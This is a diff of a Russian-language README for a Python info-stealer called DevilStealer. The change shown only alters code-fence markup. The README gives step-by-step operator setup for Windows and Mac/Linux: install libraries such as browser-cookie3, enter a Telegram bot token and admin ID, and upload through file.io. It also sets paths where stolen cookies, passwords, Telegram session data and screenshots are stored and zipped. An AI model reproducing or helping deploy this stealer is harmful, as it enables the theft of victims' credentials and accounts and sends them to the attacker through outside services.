@@ -61,32 +61,32 @@ pyTelegramBotAPI 4.13.0**
 ### Как установить
 #### Windows
 **Установка библиотек**
-\```
+```
 pip install Pillow
 pip install browser-cookie3
 pip install psutil
 pip install pywin32
 pip install pyTelegramBotAPI
-\```
+```
 **После установки библиотек скачайте и откройте архив с данным репозиторием**
 **Отредактируйте bot.py**
 Измените ADMIN_ID на ваш айди телеграмма (Получить можно в боте @chatIDrobot)
 Измените bot = telebot.Telebot("СЮДА ТОКЕН ВАШЕГО БОТА") (Создать бота можно в @BotFather)
-\```python
+```
 ADMIN_ID = "ID" # Your telegram id
 FILE_IO_API_URL = "https://file.io"
 
 bot = telebot.TeleBot("TOKEN") # Your bot token
-\```
+```
 **Если вы хотите другой путь на сохранение временных файлов стиллера то отредактируйте stealer.py**
-\```python
+```
 FILE_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData"
 FILE_COOKIE = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\cookie"
 FILE_PASSWORDS = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\passwords"
 FILE_TG = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\tdata"
 SCREENSHOT_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerDatascreenshot.jpg"
 ZIP_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming"
-\```
+```
 **!!!ВНИМАНИЕ ПУТЬ АРХИВА НЕ ДОЛЖЕН БЫТЬ В ПАПКЕ ДАННЫХ (FILE_PATH путь до этой папки и других констант) СТИЛЛЕРА!!!**
 
 **Фаил для запуска bot.py**
@@ -94,32 +94,32 @@ ZIP_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming"
 
 #### MAC OS / Linux
 **Установка библиотек**
-\```
+```
 pip3 install Pillow
 pip3 install browser-cookie3
 pip3 install psutil
 pip3 install pywin32
 pip3 install pyTelegramBotAPI
-\```
+```
 **После установки библиотек скачайте и откройте архив с данным репозиторием**
 **Отредактируйте bot.py**
 Измените ADMIN_ID на ваш айди телеграмма (Получить можно в боте @chatIDrobot)
 Измените bot = telebot.Telebot("СЮДА ТОКЕН ВАШЕГО БОТА") (Создать бота можно в @BotFather)
-\```python
+```
 ADMIN_ID = "ID" # Your telegram id
 FILE_IO_API_URL = "https://file.io"
 
 bot = telebot.TeleBot("TOKEN") # Your bot token
-\```
+```
 **Если вы хотите другой путь на сохранение временных файлов стиллера то отредактируйте stealer.py**
-\```python
+```
 FILE_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData"
 FILE_COOKIE = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\cookie"
 FILE_PASSWORDS = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\passwords"
 FILE_TG = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\tdata"
 SCREENSHOT_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerDatascreenshot.jpg"
 ZIP_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming"
-\```
+```
 **!!!ВНИМАНИЕ ПУТЬ АРХИВА НЕ ДОЛЖЕН БЫТЬ В ПАПКЕ ДАННЫХ (FILE_PATH путь до этой папки и других констант) СТИЛЛЕРА!!!**
 
 **Фаил для запуска bot.py**
